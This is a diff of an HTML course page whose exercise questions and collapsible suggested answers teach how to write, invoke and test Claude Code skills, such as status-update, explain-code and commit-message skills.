+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>Write a status update with three headings: Done, In progress, Blockers.</span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a>Use plain language for a non-technical reader and at most 150 words.</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><code>disable-model-invocation: true</code> fits because you decide when a status update is needed; Claude shouldn’t produce one unprompted. A good answer has a valid frontmatter (first line <code>---</code>, lowercase hyphenated <code>name</code> matching the folder, a clear <code>description</code>), concrete instructions, and a reason for the invocation choice. (The <code>!</code> line is optional; it pulls in live data, and <code>git log</code> is a read-only command.)</p>
+</div>
+</div>
+</div>
+</section>
+<section id="question-21-scenario" class="level4 unnumbered unlisted">
+<h4 class="unnumbered unlisted anchored" data-anchor-id="question-21-scenario">Question 21 · Scenario</h4>
+<p>Sam has written 30 personal skills with long, overlapping descriptions. Claude now often picks the wrong one. Give three concrete fixes based on this page.</p>
+<div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
+<div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-24-contents" aria-controls="callout-24" aria-expanded="false" aria-label="Toggle callout">
+<div class="callout-icon-container">
+<i class="callout-icon no-icon"></i>
+</div>
+<div class="callout-title-container flex-fill">
+Suggested answer
+</div>
+<div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
+</div>
+<div id="callout-24" class="callout-24-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
 <p>Any three of:</p>
 <ul>
@@ -1849,54 +1905,9 @@ Suggested answer
 </section>
 <section id="challenge" class="level3 unnumbered">
 <h3 class="unnumbered anchored" data-anchor-id="challenge">Challenge</h3>
-<section id="question-20-hands-on" class="level4 unnumbered unlisted">
-<h4 class="unnumbered unlisted anchored" data-anchor-id="question-20-hands-on">Question 20 · Hands-on</h4>
-<p>Create the <code>explain-code</code> skill from this page and test it both ways (let Claude choose it, and run <code>/explain-code</code>). Then change it so every explanation ends with one “check your understanding” question, and test again. Write down what changed in Claude’s answers.</p>
-<div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
-<div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-23-contents" aria-controls="callout-23" aria-expanded="false" aria-label="Toggle callout">
-<div class="callout-icon-container">
-<i class="callout-icon no-icon"></i>
-</div>
-<div class="callout-title-container flex-fill">
-Suggested answer
-</div>
-<div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
-</div>
-<div id="callout-23" class="callout-23-contents callout-collapse collapse">
-<div class="callout-body-container callout-body">
-<p>A complete answer shows: the folder <code>~/.claude/skills/explain-code/</code> with a valid <code>SKILL.md</code>; <code>explain-code</code> listed by <code>/skills</code>; one answer produced automatically (from a question such as “What does src/index.html do? Explain it for a beginner.”) and one produced by <code>/explain-code</code>; an extra instruction such as “6. End with one question that checks the reader’s understanding.”; and a note that the new question appears without restarting Claude Code (skill files are picked up during the session).</p>
-</div>
-</div>
-</div>
-</section>
-<section id="question-21-hands-on" class="level4 unnumbered unlisted">
-<h4 class="unnumbered unlisted anchored" data-anchor-id="question-21-hands-on">Question 21 · Hands-on</h4>
-<p>In a Git repository (for example the Git practice project), create the <code>commit-message</code> skill from the deeper dive as a <strong>project</strong> skill. Stage a change with <code>git add</code> and run <code>/commit-message</code>. Then try it twice more: once with nothing staged, and once from a folder that is not a Git repository. Explain each result.</p>
-<div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
-<div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-24-contents" aria-controls="callout-24" aria-expanded="false" aria-label="Toggle callout">
-<div class="callout-icon-container">
-<i class="callout-icon no-icon"></i>
-</div>
-<div class="callout-title-container flex-fill">
-Suggested answer
-</div>
-<div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
-</div>
-<div id="callout-24" class="callout-24-contents callout-collapse collapse">
-<div class="callout-body-container callout-body">
-<ul>
-<li>The skill belongs at <code>.claude/skills/commit-message/SKILL.md</code> in the repository.</li>
-<li>With a staged change: Claude Code runs <code>git diff --staged</code>, puts the diff into the instructions, and Claude shows a proposed message (a short summary line, a blank line, 2-3 bullets) without committing.</li>
-<li>With nothing staged: the command succeeds but prints nothing, so Claude follows the instruction “If there are no staged changes, say so and stop.”</li>
-<li>Outside a Git repository: the project skill isn’t there at all, so <code>/commit-message</code> isn’t available. (Even if the skill were available there, for example as a personal skill, <code>git diff --staged</code> would fail, and a failing <code>!</code> command stops the whole skill from running.)</li>
-</ul>
-</div>
-</div>
-</div>
-</section>
 <section id="question-22-hands-on" class="level4 unnumbered unlisted">
 <h4 class="unnumbered unlisted anchored" data-anchor-id="question-22-hands-on">Question 22 · Hands-on</h4>
-<p>Find a request you have typed to Claude (or another AI) at least three times this semester. Turn it into a skill. Decide: personal or project? Who should be able to run it? Then test it in a fresh session (<code>/clear</code>) by typing a natural request <strong>without</strong> naming the skill. Did Claude pick it up? If not, improve the description and try again.</p>
+<p>Create the <code>explain-code</code> skill from this page and test it both ways (let Claude choose it, and run <code>/explain-code</code>). Then change it so every explanation ends with one “check your understanding” question, and test again. Write down what changed in Claude’s answers.</p>
 <div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
 <div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-25-contents" aria-controls="callout-25" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1908,6 +1919,51 @@ Suggested answer
 <div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
 </div>
 <div id="callout-25" class="callout-25-contents callout-collapse collapse">
+<div class="callout-body-container callout-body">
+<p>A complete answer shows: the folder <code>~/.claude/skills/explain-code/</code> with a valid <code>SKILL.md</code>; <code>explain-code</code> listed by <code>/skills</code>; one answer produced automatically (from a question such as “What does src/index.html do? Explain it for a beginner.”) and one produced by <code>/explain-code</code>; an extra instruction such as “6. End with one question that checks the reader’s understanding.”; and a note that the new question appears without restarting Claude Code (skill files are picked up during the session).</p>
+</div>
+</div>
+</div>
+</section>
+<section id="question-23-hands-on" class="level4 unnumbered unlisted">
+<h4 class="unnumbered unlisted anchored" data-anchor-id="question-23-hands-on">Question 23 · Hands-on</h4>
+<p>In a Git repository (for example the Git practice project), create the <code>commit-message</code> skill from the deeper dive as a <strong>project</strong> skill. Stage a change with <code>git add</code> and run <code>/commit-message</code>. Then try it twice more: once with nothing staged, and once from a folder that is not a Git repository. Explain each result.</p>
+<div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
+<div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-26-contents" aria-controls="callout-26" aria-expanded="false" aria-label="Toggle callout">
+<div class="callout-icon-container">
+<i class="callout-icon no-icon"></i>
+</div>
+<div class="callout-title-container flex-fill">
+Suggested answer
+</div>
+<div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
+</div>
+<div id="callout-26" class="callout-26-contents callout-collapse collapse">
+<div class="callout-body-container callout-body">
+<ul>
+<li>The skill belongs at <code>.claude/skills/commit-message/SKILL.md</code> in the repository.</li>
+<li>With a staged change: Claude Code runs <code>git diff --staged</code>, puts the diff into the instructions, and Claude shows a proposed message (a short summary line, a blank line, 2-3 bullets) without committing.</li>
+<li>With nothing staged: the command succeeds but prints nothing, so Claude follows the instruction “If there are no staged changes, say so and stop.”</li>
+<li>Outside a Git repository: the project skill isn’t there at all, so <code>/commit-message</code> isn’t available. (Even if the skill were available there, for example as a personal skill, <code>git diff --staged</code> would fail, and a failing <code>!</code> command stops the whole skill from running.)</li>
+</ul>
+</div>
+</div>
+</div>
+</section>
+<section id="question-24-hands-on" class="level4 unnumbered unlisted">
+<h4 class="unnumbered unlisted anchored" data-anchor-id="question-24-hands-on">Question 24 · Hands-on</h4>
+<p>Find a request you have typed to Claude (or another AI) at least three times this semester. Turn it into a skill. Decide: personal or project? Who should be able to run it? Then test it in a fresh session (<code>/clear</code>) by typing a natural request <strong>without</strong> naming the skill. Did Claude pick it up? If not, improve the description and try again.</p>
+<div class="yr-answer callout callout-style-default callout-tip no-icon callout-titled">
+<div class="callout-header d-flex align-content-center" data-bs-toggle="collapse" data-bs-target=".callout-27-contents" aria-controls="callout-27" aria-expanded="false" aria-label="Toggle callout">
+<div class="callout-icon-container">
+<i class="callout-icon no-icon"></i>
+</div>
+<div class="callout-title-container flex-fill">
+Suggested answer
+</div>
+<div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
+</div>
+<div id="callout-27" class="callout-27-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
 <p>A good submission includes the <code>SKILL.md</code>; a reason for its location (project if teammates need it and it belongs to that project, personal if it’s your own habit across projects); a reason for its invocation setting (<code>disable-model-invocation: true</code> if it has side effects or should run only on request); the natural-language request used for testing; and, if Claude didn’t pick it up at first, the before-and-after descriptions showing how adding the words people actually type fixed it.</p>
 </div>
